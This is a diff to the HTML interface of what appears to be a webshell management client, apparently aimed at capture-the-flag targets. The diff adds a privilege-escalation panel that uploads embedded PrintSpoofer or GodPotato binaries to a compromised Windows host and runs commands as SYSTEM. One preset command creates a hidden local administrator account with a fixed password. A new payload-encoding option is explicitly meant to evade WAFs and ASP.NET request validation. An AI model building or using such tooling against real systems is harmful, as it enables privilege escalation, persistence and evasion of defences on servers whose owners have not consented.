@@ -16,6 +16,15 @@
     </div>
   </div>
   <div class="topbar-right">
+    <span class="theme-pick">
+      <label class="theme-label" for="themeSelect">主题</label>
+      <select id="themeSelect" class="theme-select">
+        <option value="dark">暗色 (GitHub)</option>
+        <option value="light">亮色</option>
+        <option value="solarized">Solarized</option>
+        <option value="monokai">Monokai</option>
+      </select>
+    </span>
     <button id="btnSettings" class="btn ghost">全局设置</button>
     <button id="btnNew" class="btn primary">新建靶标</button>
   </div>
@@ -51,6 +60,7 @@
         </div>
         <div class="actions">
           <button id="btnEdit" class="btn ghost">编辑</button>
+          <button id="btnClearCache" class="btn ghost" title="清空靶机上缓存的模块源码（修复模块后需重新加载）">清空模块缓存</button>
           <button id="btnDelete" class="btn danger">删除</button>
         </div>
       </div>
@@ -84,18 +94,16 @@
           <svg class="tab-ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><path d="M14 2v6h6"/><path d="M9 13l2 2 4-4"/></svg>
           <span>环境</span>
         </button>
+        <button class="tab" data-tab="privesc">
+          <svg class="tab-ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3l7 3v5c0 4.5-3 7.5-7 9-4-1.5-7-4.5-7-9V6z"/><path d="M12 11v6"/><path d="M9 14l3-3 3 3"/></svg>
+          <span>提权</span>
+        </button>
       </div>
 
       <div id="termPanel">
         <div class="quick">
           <span class="label">快捷命令</span>
-          <button class="chip" data-cmd="whoami">whoami</button>
-          <button class="chip" data-cmd="id">id</button>
-          <button class="chip" data-cmd="uname -a">uname -a</button>
-          <button class="chip" data-cmd="pwd">pwd</button>
-          <button class="chip" data-cmd="ls -la">ls -la</button>
-          <button class="chip" data-cmd="ip addr">ip addr</button>
-          <button class="chip" data-cmd="cat /etc/passwd">cat /etc/passwd</button>
+          <div id="quickCmds" class="quick-chips"></div>
         </div>
 
         <div class="console">
@@ -135,7 +143,10 @@
           </div>
           <div class="fs-editor-body">
             <pre id="fsGutter" class="fs-gutter" aria-hidden="true"></pre>
-            <textarea id="fsContent" spellcheck="false"></textarea>
+            <div class="fs-code">
+              <pre id="fsHl" class="fs-hl" aria-hidden="true"></pre>
+              <textarea id="fsContent" spellcheck="false"></textarea>
+            </div>
           </div>
         </div>
         <input id="fsFileInput" type="file" class="hidden">
@@ -213,6 +224,59 @@
         </div>
         <div id="phpinfoBody" class="phpinfo-body"></div>
       </div>
+
+      <div id="privescPanel" class="privesc-panel hidden">
+        <div class="privesc-toolbar">
+          <label class="privesc-field">提权工具
+            <select id="peTool" class="scan-input">
+              <option value="printspoofer">PrintSpoofer</option>
+              <option value="godpotato-go">GodPotato (Go)</option>
+            </select>
+          </label>
+          <span id="peToolNote" class="fs-hint privesc-note"></span>
+        </div>
+
+        <div class="privesc-form">
+          <label class="privesc-field wide">靶机上工具路径
+            <input id="pePath" class="scan-input wide" type="text" spellcheck="false" placeholder="C:\Windows\Temp\PrintSpoofer.exe">
+          </label>
+          <label class="privesc-field" id="peModeField">执行模式
+            <select id="peMode" class="scan-input">
+              <option value="command">运行命令（以 SYSTEM 身份）</option>
+              <option value="list">仅列出可模拟权限 (-l)</option>
+              <option value="interactive">交互式 (-i，通常无回显)</option>
+            </select>
+          </label>
+          <label class="privesc-field" id="pePidField">模拟进程 PID（可选，默认 4）
+            <input id="pePid" class="scan-input" type="text" spellcheck="false" placeholder="4">
+          </label>
+        </div>
+
+        <div id="peCmdWrap" class="privesc-cmdwrap">
+          <label class="privesc-field wide">要执行的命令（将以 SYSTEM 身份运行）
+            <textarea id="peCmd" class="pe-cmd" spellcheck="false" placeholder="whoami /priv"></textarea>
+          </label>
+          <label class="privesc-field wide">快捷模板
+            <select id="pePreset" class="scan-input wide">
+              <option value="">— 选择模板填入命令框 —</option>
+              <option value="whoami /priv">查看特权 (whoami /priv)</option>
+              <option value="whoami">确认当前身份 (whoami)</option>
+              <option value="net localgroup administrators">列出管理员组成员</option>
+              <option value="net user weshell P@ssw0rd123! /add &amp;&amp; net localgroup administrators weshell /add">添加本地管理员账户</option>
+            </select>
+          </label>
+        </div>
+
+        <div class="privesc-actions">
+          <button id="peRun" class="btn primary">运行</button>
+          <button id="peDeploy" class="btn">部署自检</button>
+          <span id="peStatus" class="pe-status"></span>
+        </div>
+
+        <div class="fs-hint">服务端已内嵌 PrintSpoofer.exe 与 GodPotato (Go)，点击运行会先自动上传到下方路径（已存在且 MD5 一致则跳过），再以 SYSTEM 身份执行；仅支持 php-eval / asp / asp-vbs / aspnet 类型靶机。GodPotato (Go) 不依赖 .NET 且只有「运行命令」模式；PrintSpoofer 的 Interactive(-i) 模式会派生交互式 cmd，通常无法通过 webshell 取回输出，建议优先用「运行命令」模式。</div>
+
+        <div id="privescOutput" class="output privesc-output" aria-live="polite"></div>
+      </div>
     </div>
   </section>
 </main>
@@ -243,6 +307,20 @@
           </select>
         </label>
       </div>
+      <div class="row">
+        <label>载荷编码
+          <select name="encoding" id="encoding">
+            <option value="">无（默认）</option>
+            <option value="base64">base64</option>
+            <option value="hex">hex</option>
+            <option value="xor">xor</option>
+          </select>
+        </label>
+        <label class="enc-key" id="encKeyWrap" style="display:none">编码密钥
+          <input name="encodingKey" placeholder="xor 所需的密钥">
+        </label>
+      </div>
+      <p class="note">编码用于绕过 WAF / ASP.NET 请求验证：base64 与 hex 不含 &lt; &gt; &amp;，可规避 ASP.NET 对表单的拦截；xor 需配合密钥。aspnet 类型默认按 base64 处理。</p>
       <label>备注
         <input name="note" placeholder="题目来源、解题思路等">
       </label>
